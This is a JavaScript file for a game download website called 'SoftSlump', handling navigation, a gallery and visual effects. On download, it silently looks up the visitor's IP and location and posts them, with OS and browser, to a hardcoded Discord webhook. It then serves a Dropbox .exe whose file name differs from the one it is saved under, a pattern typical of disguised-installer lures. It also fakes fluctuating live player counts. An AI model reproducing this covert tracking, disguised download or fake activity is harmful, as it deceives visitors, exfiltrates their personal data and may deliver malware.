/* ============================================================
   SoftSlump — main.js
   Navigation, gallery, stats counter, download modal + Discord webhook
   ============================================================ */

// ---- NAV SCROLL EFFECT ----
const nav = document.getElementById('mainNav');
window.addEventListener('scroll', () => {
    if (window.scrollY > 40) nav.classList.add('scrolled');
    else nav.classList.remove('scrolled');
}, { passive: true });

// ---- HAMBURGER MENU ----
const hamburger = document.getElementById('hamburger');
const mobileMenu = document.getElementById('mobileMenu');

hamburger.addEventListener('click', () => {
    mobileMenu.classList.toggle('open');
});

function closeMobile() {
    mobileMenu.classList.remove('open');
}

document.addEventListener('click', (e) => {
    if (!mobileMenu.contains(e.target) && !hamburger.contains(e.target)) {
        mobileMenu.classList.remove('open');
    }
});

// ---- SCREENSHOT GALLERY ----
const shots = ['oyunpp.png', 'oyunpp2.png', 'oyunpp3.png', 'oyunpp4.png'];
const activeShot = document.getElementById('activeShot');
const zoneLabel = document.getElementById('zoneLabel');
const slideCounter = document.getElementById('slideCounter');
const thumbs = document.querySelectorAll('.thumb-item');
let currentIndex = 0;

function switchShot(index) {
    currentIndex = index;
    activeShot.style.opacity = '0';
    activeShot.style.transform = 'scale(0.97)';
    setTimeout(() => {
        activeShot.src = shots[index];
        zoneLabel.textContent = thumbs[index].dataset.zone;
        if (slideCounter) slideCounter.textContent = `0${index + 1} / 04`;
        activeShot.style.opacity = '1';
        activeShot.style.transform = 'scale(1)';
    }, 220);

    thumbs.forEach((t, i) => {
        t.classList.toggle('active', i === index);
    });
}

function galleryNav(dir) {
    const next = (currentIndex + dir + shots.length) % shots.length;
    switchShot(next);
}

if (activeShot) {
    activeShot.style.transition = 'opacity 0.22s ease, transform 0.22s ease';
}

// ---- STATS COUNTER ANIMATION ----
function animateCounter(el, target, suffix = '') {
    let start = 0;
    const duration = 1800;
    const step = (timestamp) => {
        if (!start) start = timestamp;
        const progress = Math.min((timestamp - start) / duration, 1);
        const ease = 1 - Math.pow(1 - progress, 3);
        el.textContent = Math.floor(ease * target) + suffix;
        if (progress < 1) requestAnimationFrame(step);
        else el.textContent = target + suffix;
    };
    requestAnimationFrame(step);
}

const statsObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            document.querySelectorAll('.stat-num').forEach(el => {
                const text = el.textContent;
                const target = parseInt(text);
                if (!isNaN(target)) animateCounter(el, target, text.includes('+') ? '+' : '');
            });
            statsObserver.disconnect();
        }
    });
}, { threshold: 0.3 });

const heroEl = document.querySelector('.hero-stats');
if (heroEl) statsObserver.observe(heroEl);

// ---- SCROLL REVEAL ----
const revealObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
            revealObserver.unobserve(entry.target);
        }
    });
}, { threshold: 0.1, rootMargin: '0px 0px -60px 0px' });

document.querySelectorAll('.about-card, .feature-row').forEach((el, i) => {
    const delay = el.dataset.delay || i * 80;
    el.style.cssText += `
    opacity: 0;
    transform: translateY(32px);
    transition: opacity 0.6s ease ${delay}ms, transform 0.6s ease ${delay}ms;
  `;
    revealObserver.observe(el);
});

// ---- TOAST ----
const toast = document.getElementById('downloadToast');

function showToast(msg) {
    if (toast) {
        const span = toast.querySelector('span');
        if (span && msg) span.textContent = msg;
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 3500);
    }
}

// ---- DOWNLOAD MODAL ----
function openDownloadModal() {
    let modal = document.getElementById('downloadModal');
    if (!modal) return;
    modal.classList.add('open');
    document.body.style.overflow = 'hidden';
}

function closeDownloadModal() {
    let modal = document.getElementById('downloadModal');
    if (!modal) return;
    modal.classList.remove('open');
    document.body.style.overflow = '';
}

// Close on overlay click
document.addEventListener('click', (e) => {
    const modal = document.getElementById('downloadModal');
    if (modal && e.target === modal) closeDownloadModal();
});


// ---- DISCORD WEBHOOK ----
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1493315362383593492/UM-aoQ7uDp63F9q_z6xJAwvlGqSC-wyeD2qdZ5Niv-xCYVOEcOXiSpu2yEmPh__jE8gd';

function getBrowserName() {
    const ua = navigator.userAgent;
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('Edg')) return 'Microsoft Edge';
    if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
    if (ua.includes('Chrome')) return 'Chrome';
    if (ua.includes('Safari')) return 'Safari';
    return 'Other Browser';
}

function getOS() {
    const ua = navigator.userAgent;
    if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
    if (ua.includes('Windows NT 6.1')) return 'Windows 7';
    if (ua.includes('Windows')) return 'Windows';
    if (ua.includes('Mac OS') || ua.includes('Macintosh')) return 'macOS';
    if (ua.includes('Linux')) return 'Linux';
    if (ua.includes('Android')) return 'Android';
    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
    return 'Unknown OS';
}

function getHardwareInfo() {
    return {
        screen: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language || 'Unknown',
        cores: navigator.hardwareConcurrency || 'N/A',
        memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A'
    };
}

async function notifyDiscord() {
    const now = new Date();
    const timestamp = now.toISOString();

    let location = 'Unknown';
    let ip = 'Unknown';
    let countryFlag = '';
    try {
        const geoResp = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
        if (geoResp.ok) {
            const geo = await geoResp.json();
            ip = geo.ip || 'Unknown';
            const city = geo.city || '';
            const region = geo.region || '';
            const country = geo.country_name || '';
            location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';

            if (geo.country_code) {
                const code = geo.country_code.toUpperCase();
                countryFlag = String.fromCodePoint(
                    ...[...code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)
                );
            }
        }
    } catch (_) { /* silent */ }

    const browserName = getBrowserName();
    const osName = getOS();
    const nowLocal = new Intl.DateTimeFormat('tr-TR', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    }).format(now);

    const payload = {
        username: "SoftSlump — Download Bot",
        avatar_url: "https://i.imgur.com/3nFzlv6.png",
        embeds: [
            {
                title: "❄️ New SoftSlump Download!",
                description: "Someone just braved the storm. **SoftSlump** download initiated.",
                color: 0x0099ff, // Reference Blue
                fields: [
                    {
                        name: "🌍 Location",
                        value: `\`${location}\` ${countryFlag || ''}`,
                        inline: false
                    },
                    {
                        name: "🖥️ IP Address",
                        value: `\`${ip}\``,
                        inline: false
                    },
                    {
                        name: "⌚ Time",
                        value: `\`${nowLocal}\``,
                        inline: false
                    },
                    {
                        name: "🔗 Platform",
                        value: `\`${osName}\``,
                        inline: false
                    },
                    {
                        name: "🌐 Browser",
                        value: `\`${browserName}\``,
                        inline: false
                    }
                ],
                footer: {
                    text: "SoftSlump • SoftSlump.com",
                    icon_url: "https://i.imgur.com/3nFzlv6.png"
                },
                timestamp: timestamp
            }
        ]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
    } catch (_) { /* silent */ }
}

// ---- START ACTUAL FILE DOWNLOAD ----
function startFileDownload() {
    const a = document.createElement('a');
    a.href = 'https://www.dropbox.com/scl/fi/bfxs71505y33ihjeoss0o/DuskaraSaga-Setup-V2.exe?rlkey=2z6fpddelcrf1i7yxl8zz4y6e&st=w59j33pg&dl=1';
    a.download = 'SoftSlump Setup 2.0.0.exe';
    a.style.display = 'none'; // Ensure it's hidden
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
        document.body.removeChild(a);
    }, 100);
}

// ---- TOAST SYSTEM ----
function showToast(msg) {
    const toast = document.getElementById('downloadToast');
    const span = toast.querySelector('span');
    if (!toast || !span) return;

    span.textContent = msg;
    toast.classList.add('show');

    setTimeout(() => {
        toast.classList.remove('show');
    }, 15000);
}

// ---- TRIGGER DOWNLOAD (main entry point) ----
async function triggerDownload() {
    showToast('Download starting...');

    // Fire webhook silently in background
    notifyDiscord();

    // Start file download with slight delay for UX
    setTimeout(() => {
        startFileDownload();
    }, 600);
}

// ---- SMOOTH SCROLL ----
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', (e) => {
        const target = document.querySelector(anchor.getAttribute('href'));
        if (target) {
            e.preventDefault();
            target.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    });
});

// Lobbies Player Count Fluctuation
function fluctuateLobbies() {
    const eu = document.getElementById('count-eu');
    const us = document.getElementById('count-us');
    const asia = document.getElementById('count-as');
    
    if(!eu || !us || !asia) return;

    // We keep counts low because it's in beta, but spike them shortly
    let euCount = parseInt(eu.innerText);
    let usCount = parseInt(us.innerText);
    let asiaCount = parseInt(asia.innerText);

    setInterval(() => {
        // Randomly add or subtract 1 to 3 players, occasionally spike
        const spike = Math.random() > 0.8 ? 5 : 0;
        
        euCount = Math.max(3, Math.min(24, euCount + Math.floor(Math.random() * 5 - 2) + spike));
        usCount = Math.max(2, Math.min(18, usCount + Math.floor(Math.random() * 4 - 2) + spike));
        asiaCount = Math.max(1, Math.min(12, asiaCount + Math.floor(Math.random() * 3 - 1)));

        eu.innerText = euCount;
        us.innerText = usCount;
        asia.innerText = asiaCount;
        
        // short momentary drop if it went too high
        if(spike > 0) {
            setTimeout(() => {
                euCount -= spike;
                usCount -= spike;
            }, 8000);
        }
    }, 15000);
}

document.addEventListener('DOMContentLoaded', () => {
    fluctuateLobbies();
});

// ---- MOUSE CURSOR GLOW ----
(function() {
    const glow = document.createElement('div');
    glow.id = 'cursorGlow';
    glow.style.cssText = `
        position: fixed;
        width: 400px;
        height: 400px;
        border-radius: 50%;
        background: radial-gradient(circle, rgba(255,90,0,0.12) 0%, rgba(255,60,0,0.04) 40%, transparent 70%);
        pointer-events: none;
        z-index: 9990;
        transform: translate(-50%, -50%);
        transition: opacity 0.3s ease;
        will-change: left, top;
        opacity: 0;
    `;
    document.body.appendChild(glow);

    let mx = 0, my = 0;
    let cx = 0, cy = 0;
    let raf;

    document.addEventListener('mousemove', (e) => {
        mx = e.clientX;
        my = e.clientY;
        glow.style.opacity = '1';
    });

    document.addEventListener('mouseleave', () => {
        glow.style.opacity = '0';
    });

    function animateGlow() {
        cx += (mx - cx) * 0.08;
        cy += (my - cy) * 0.08;
        glow.style.left = cx + 'px';
        glow.style.top = cy + 'px';
        raf = requestAnimationFrame(animateGlow);
    }
    animateGlow();

    // Click spark burst
    document.addEventListener('click', (e) => {
        for (let i = 0; i < 8; i++) {
            const spark = document.createElement('div');
            const angle = (i / 8) * Math.PI * 2;
            const speed = 40 + Math.random() * 40;
            spark.style.cssText = `
                position: fixed;
                left: ${e.clientX}px;
                top: ${e.clientY}px;
                width: 4px;
                height: 4px;
                border-radius: 50%;
                background: rgba(255,${100 + Math.random()*100|0},0,0.9);
                pointer-events: none;
                z-index: 9995;
                transform: translate(-50%,-50%);
                box-shadow: 0 0 6px rgba(255,100,0,0.8);
            `;
            document.body.appendChild(spark);
            const tx = Math.cos(angle) * speed;
            const ty = Math.sin(angle) * speed;
            spark.animate([
                { transform: 'translate(-50%,-50%) scale(1)', opacity: 1 },
                { transform: `translate(calc(-50% + ${tx}px), calc(-50% + ${ty}px)) scale(0)`, opacity: 0 }
            ], { duration: 500 + Math.random() * 300, easing: 'ease-out' }).onfinish = () => spark.remove();
        }
    });
})();

// ---- EMBER PARTICLE BACKGROUND ----
(function() {
    const canvas = document.createElement('canvas');
    canvas.id = 'emberCanvas';
    canvas.style.cssText = `
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 0;
        opacity: 0.6;
    `;
    document.body.insertBefore(canvas, document.body.firstChild);

    const ctx = canvas.getContext('2d');
    let W, H, embers = [];

    function resize() {
        W = canvas.width = window.innerWidth;
        H = canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize, { passive: true });

    class Ember {
        constructor() { this.reset(true); }
        reset(init) {
            this.x = Math.random() * W;
            this.y = init ? Math.random() * H : H + 10;
            this.size = 0.5 + Math.random() * 2.5;
            this.speedY = -(0.3 + Math.random() * 0.8);
            this.speedX = (Math.random() - 0.5) * 0.4;
            this.life = 0;
            this.maxLife = 120 + Math.random() * 180;
            this.hue = 15 + Math.random() * 30;
        }
        update() {
            this.x += this.speedX + Math.sin(this.life * 0.04) * 0.3;
            this.y += this.speedY;
            this.life++;
            if (this.y < -10 || this.life > this.maxLife) this.reset(false);
        }
        draw() {
            const alpha = Math.sin((this.life / this.maxLife) * Math.PI) * 0.7;
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            ctx.fillStyle = `hsla(${this.hue}, 100%, 60%, ${alpha})`;
            ctx.shadowBlur = 6;
            ctx.shadowColor = `hsla(${this.hue}, 100%, 50%, ${alpha})`;
            ctx.fill();
        }
    }

    for (let i = 0; i < 80; i++) embers.push(new Ember());

    function loop() {
        ctx.clearRect(0, 0, W, H);
        ctx.shadowBlur = 0;
        embers.forEach(e => { e.update(); e.draw(); });
        requestAnimationFrame(loop);
    }
    loop();
})();
